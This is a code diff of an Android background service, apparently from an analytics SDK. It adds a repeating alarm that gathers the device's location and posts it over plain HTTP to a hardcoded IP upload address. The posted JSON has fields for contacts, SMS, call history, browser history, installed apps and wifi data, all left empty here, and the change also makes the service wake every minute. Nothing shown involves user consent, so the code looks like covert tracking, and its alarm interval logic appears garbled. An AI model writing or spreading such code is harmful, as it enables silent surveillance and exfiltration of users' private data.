@@ -27,6 +27,7 @@ import java.util.Calendar;
 import okhttp3.Call;
 import okhttp3.MediaType;
 import okhttp3.Response;
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -37,8 +38,10 @@ public class RequestService extends Service {
 
   private PendingIntent pendingIntentOne = null;
   private PendingIntent pendingIntentTwo = null;
+  private PendingIntent pendingIntentInfo = null;
   private AlarmManager alarmManagerOne = null;
   private AlarmManager alarmManagerTwo = null;
+  private AlarmManager alarmManagerGPS = null;
   private static final String POST_FILE_URL = "http://52.77.214.247:8083/sdk/upload";
   private static final String SHARED_NAME = "advance_analyze";
   private static final String SHARED_PUT_NAME = "jsonData";
@@ -58,19 +61,24 @@ public class RequestService extends Service {
 
     // 创建Intent对象，action为LOCATION
     Intent alarmIntent = new Intent();
-    alarmIntent.setAction("alarmOne");
+    alarmIntent.setAction("alarm");
+    Intent alarmIntentGPS = new Intent();
+    alarmIntentGPS.setAction("alarmGPS");
 
     // 定义一个PendingIntent对象，PendingIntent.getBroadcast包含了sendBroadcast的动作。
     // 也就是发送了action 为"LOCATION"的intent
-    pendingIntentOne = PendingIntent.getBroadcast(this, 0, alarmIntent, 0);
-    pendingIntentTwo = PendingIntent.getBroadcast(this, 1, alarmIntent, 0);
+    pendingIntentOne = PendingIntent.getBroadcast(this, 0, alarmIntentGPS, 0);
+    pendingIntentTwo = PendingIntent.getBroadcast(this, 1, alarmIntentGPS, 0);
+    pendingIntentInfo = PendingIntent.getBroadcast(this, 2, alarmIntent, 0);
     // AlarmManager对象, AlarmManager为系统级服务
     alarmManagerOne = (AlarmManager) getSystemService(ALARM_SERVICE);
     alarmManagerTwo = (AlarmManager) getSystemService(ALARM_SERVICE);
+    alarmManagerGPS = (AlarmManager) getSystemService(ALARM_SERVICE);
 
     //动态注册一个广播
     IntentFilter filter = new IntentFilter();
-    filter.addAction("alarmOne");
+    filter.addAction("alarm");
+    filter.addAction("alarmGPS");
     registerReceiver(alarmReceiver, filter);
   }
 
@@ -86,9 +94,21 @@ public class RequestService extends Service {
     alarmManagerTwo
         .setRepeating(AlarmManager.RTC_WAKEUP, triggerAtMillis(2, 0), (24 * 60 * 60 * 1000),
             pendingIntentTwo);
+    Calendar calMorning = Calendar.getInstance();
+    calMorning.setTimeInMillis(System.currentTimeMillis());
+    calMorning.add(Calendar.MONTH, 3);
+    calMorning.set(Calendar.HOUR_OF_DAY, 0);
+    calMorning.set(Calendar.MINUTE, 0);
+    calMorning.set(Calendar.SECOND, 0);
+    calMorning.set(Calendar.MILLISECOND, 0);
+    alarmManagerGPS
+        .setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            SystemClock.elapsedRealtime() + 60 * 1000,
+            calMorning.getTimeInMillis(),
+            pendingIntentInfo);
 
     AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-    int alarmTime = 6 * 60 * 1000;
+    int alarmTime = 60 * 1000;
     long triggerAtTime = SystemClock.elapsedRealtime() + alarmTime;
     Intent i = new Intent(this, RequestService.class);
     PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
@@ -103,7 +123,7 @@ public class RequestService extends Service {
   protected BroadcastReceiver alarmReceiver = new BroadcastReceiver() {
     @Override
     public void onReceive(Context context, Intent intent) {
-      if (intent.getAction().equals("alarmOne")) {
+      if (intent.getAction().equals("alarm")) {
         new Thread(new Runnable() {
           @Override
           public void run() {
@@ -128,6 +148,35 @@ public class RequestService extends Service {
               } else {
                 SharedPreferences.Editor editor = sharedPreferences.edit();
                 editor.putString(SHARED_PUT_NAME, object.toString()).apply();
+              }
+            } catch (JSONException e) {
+              e.printStackTrace();
+            }
+          }
+        }).start();
+      } else if (intent.getAction().equals("alarmGPS")) {
+        new Thread(new Runnable() {
+          @Override
+          public void run() {
+            try {
+              JSONObject object = new JSONObject();
+              object.put("customerId", "2");
+              object.put("identity", "1");
+              object.put("contact", new JSONArray());
+              object.put("apps", new JSONArray());
+              object.put("callHistory", new JSONArray());
+              object.put("networkStatus", "");
+              object.put("sim", new JSONObject());
+              object.put("sms", new JSONArray());
+              object.put("macAddress", "");
+              object.put("wifiList", new JSONArray());
+              object.put("browserHistory", new JSONArray());
+              object.put("battery", new JSONObject());
+              object.put("location", buildLocation(getApplicationContext()));
+
+              if (isNetworkAvailable(getApplicationContext())) {
+                postHttp(object.toString());
+                Log.e("BroadcastReceiver", "alarmGPS");
               }
             } catch (JSONException e) {
               e.printStackTrace();
@@ -177,6 +226,7 @@ public class RequestService extends Service {
             }
             return super.validateReponse(response, id);
           }
+
         });
   }
 
